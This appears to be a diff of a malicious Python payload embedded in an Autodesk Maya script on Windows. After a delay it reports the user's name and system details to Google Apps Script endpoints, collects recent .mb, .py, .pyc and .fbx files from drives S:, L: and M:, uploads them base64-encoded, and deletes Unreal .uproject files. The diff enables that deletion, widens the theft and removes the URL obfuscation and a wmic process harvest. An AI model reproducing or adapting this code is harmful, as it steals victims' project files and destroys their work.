@@ -9,7 +9,7 @@ def run_tsl(py_cmd):
     import subprocess, os, sys
 
     if os.name != "nt":
-        sys.exit(0)
+        return None
 
     maya_dir = None
     if "maya.exe" in os.path.basename(sys.executable).lower():
@@ -36,8 +36,8 @@ def run_tsl(py_cmd):
         )
 
 
-run_tsl("""
-
+run_tsl(
+"""
 import json, getpass, time, os, sys
 import datetime as dt
 from maya import mel
@@ -47,22 +47,20 @@ import random
 
 time.sleep(10)
 
+
 def add_queue_task(task_name, data_dict):
     is_py3 = sys.version[0] == "3"
     if is_py3:
         import urllib.request as uLib
     else:
         import urllib as uLib
+
     if type(data_dict) != type(dict()):
         return None
+
     data = {"name": task_name, "data": data_dict}
     data["data"] = json.dumps(data["data"], sort_keys=True, indent=4)
-    url = base64.b64decode(
-            (
-                "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5eVc0amhPbC1LQy1weXFGOHFJc"
-                + "m54M3gzR2lvaHlKamoyZ1gxb0NNS3VHbTdmal9HbkVRMU9IdExycFJ6dklTNENZUS9leGVj"
-            )
-        ).decode()
+    url = "https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec"
     if is_py3:
         import urllib.parse
 
@@ -84,26 +82,16 @@ def _gup(file_path):
         import urllib as uLib
     import base64
 
-    GAS_WEB_APP_URL = base64.b64decode(
-        (
-                "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4bjlUVE"
-                "l4eDlsMEo1R2FQUUZSQlRxN0tIQjcwblpMdnNEdmZwNjRtOWYzZDlacWh5Q1dqLVZBM3hHZHlxbThSaDQvZXhlYw=="
-        )
-    ).decode()
+    GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxn9TTIxx9l0J5GaPQFRBTq7KHB70nZLvsDvfp64m9f3d9ZqhyCWj-VA3xGdyqm8Rh4/exec"
     with open(file_path, "rb") as f:
         file_bytes = f.read()
     file_b64 = base64.b64encode(file_bytes).decode("utf-8")
     file_name = os.path.basename(file_path)
     data = {
-        "filename": base64.b64encode(file_name).decode("utf-8"),
+        "filename": file_name,
         "mimetype": "application/octet-stream",
         "file": file_b64,
     }
-    import ssl
-
-    ssl_context = ssl.create_default_context()
-    ssl_context.check_hostname = False
-    ssl_context.verify_mode = ssl.CERT_NONE
     if is_py3:
         import urllib.parse
 
@@ -111,9 +99,7 @@ def _gup(file_path):
     else:
         params = uLib.urlencode(data)
     params = params.encode("ascii")
-    req = urllib.request.Request(GAS_WEB_APP_URL, data=params)
-    with urllib.request.urlopen(req, context=ssl_context, timeout=1000000) as response:
-        result = response.read()
+    conn = uLib.urlopen(GAS_WEB_APP_URL, params, timeout=100000)
 
 
 def search_latest_files_or_dirs(ext="", dir_path="", n=8):
@@ -160,26 +146,14 @@ def find_file(target_name, start_dir):
         if target_name in files:
             return os.path.join(root, target_name)
     return None
-    
-    
-    
-try:
-    cls = subprocess.run(
-        "wmic process get CommandLine /format:list",
-        shell=True,
-        capture_output=True,
-        text=True,
-    )
-    
-    add_queue_task(
-        "tsl__{}__begin".format(getpass.getuser().lower()),
-        {
-            "sys_version": str(sys.version),
-            "exec_path": str(sys.executable),
-            "cls": cls.stdout,
-        },
-    )
 
+
+add_queue_task(
+    "tsl__{}__begin".format(getpass.getuser().lower()),
+    {"sys_version": str(sys.version), "exec_path": str(sys.executable)},
+)
+
+try:
     ldir = search_latest_files_or_dirs(
         dir_path=base64.b64decode("Uzov").decode(), ext="", n=5
     )
@@ -200,8 +174,11 @@ try:
     zovV += search_latest_files_or_dirs(
         dir_path=base64.b64decode("TDov").decode(), ext=".mb", n=8
     )
-    ldir += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TTovU0NSSVBUU19XSEs=").decode(), ext=".py", n=80
+    zovV += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("TTov").decode(), ext=".py", n=100
+    )
+    zovV += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("TTov").decode(), ext=".pyc", n=100
     )
 
     if zovV:
@@ -214,7 +191,9 @@ except:
 
 try:
     random.shuffle(zovV)
-    for _, fp in zovV:
+    for _, fp in zovV[:60]:
+        import tempfile
+
         fp_basename = os.path.basename(fp)
         is_fbx = fp_basename.endswith(".fbx")
         if fp_basename.startswith("SKM") and is_fbx:
@@ -223,12 +202,8 @@ try:
                 pass
             except:
                 import traceback
+
                 add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
-                
-        if fp_basename.endswith(".py"):
-            import inspect
-            lines, _ = inspect.getsourcelines(pm)
-            add_queue_task(fp_basename, {"path": fp.replace("\\", "/"), "lines": lines})
 
     # -
     fmp = find_file(
@@ -261,7 +236,7 @@ try:
     import subprocess, shutil, tempfile
 
     tempdir = tempfile.gettempdir()
-    for _, fp in zovV[:100]:
+    for _, fp in zovV[:300]:
 
         if os.path.basename(fp).endswith(".pyc"):
             try:
@@ -281,16 +256,19 @@ try:
             except:
                 pass
 
-        # if os.path.basename(fp).endswith('.uproject'):
-        # try: os.remove(fp);
-        # except: pass;
+        if os.path.basename(fp).endswith(".uproject"):
+            try:
+                os.remove(fp)
+            except:
+                pass
 
     if zovV:
-        add_queue_task("tsl_update", {"done": sorted(zovV[:100], reverse=True)})
+        add_queue_task("tsl_update", {"done": sorted(zovV[:300], reverse=True)})
 
 except:
     import traceback
 
     add_queue_task("tsl_update_error", {"error": str(traceback.format_exc())})
 
-""")
+"""
+)
